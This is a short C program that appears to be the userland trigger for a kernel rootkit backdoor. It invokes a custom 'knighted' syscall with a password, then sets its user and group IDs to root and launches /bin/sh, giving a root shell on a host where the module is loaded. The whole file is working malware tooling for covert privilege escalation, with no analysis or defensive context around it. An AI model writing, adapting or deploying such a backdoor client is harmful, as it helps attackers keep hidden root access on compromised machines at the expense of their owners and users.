#include <unistd.h>	/* setuid, .. */
#include <sys/types.h>	/* setuid, .. */
#include <grp.h>	/* setgroups */
#include <stdio.h>	/* perror */
#include <sys/syscall.h>
#include <stdlib.h>

int main (int argc, char** argv) {

   if (argc != 3) {
      printf("[-] Usage: %s <syscall> <password>\n", argv[0]);
      return -1;
   }

   int syscall_num = atoi(argv[1]);

   if (syscall(syscall_num, argv[2]) != 0) {
      printf("[x] knighted syscall %d failed. Is module loaded?\n", syscall_num);
      return -1;
   }

  gid_t newGrp = 0;

  if (setuid(0) != 0) {
    perror("[x] Setuid failed, no suid-bit set?");
    return 1;
  }

  char *argv2[1]={argv[0]};
  seteuid(0);
  setegid(0);
  setgroups(1, &newGrp);
  execvp("/bin/sh", argv2); 

  return 0;
}
